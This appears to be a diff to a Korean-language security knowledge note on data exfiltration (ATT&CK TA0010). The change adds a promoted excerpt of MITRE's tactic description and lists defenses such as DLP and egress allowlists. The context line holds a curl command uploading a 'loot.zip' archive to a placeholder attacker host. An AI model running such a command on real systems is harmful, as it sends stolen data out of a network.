@@ -22,3 +22,12 @@ curl -F f=@loot.zip http://<lhost>/up
 DLP·egress 필터·아웃바운드 허용목록·비정상 전송 탐지.
 
 - 출처(검증): https://attack.mitre.org/tactics/TA0010/
+
+## 최신 보강(승격)
+
+> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.
+
+### ATT&CK TA0010 Exfiltration
+- 출처: https://attack.mitre.org/tactics/TA0010/
+- 승격일: 2026-10-07
+- 요약: Exfiltration The adversary is trying to steal data. Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission. ID
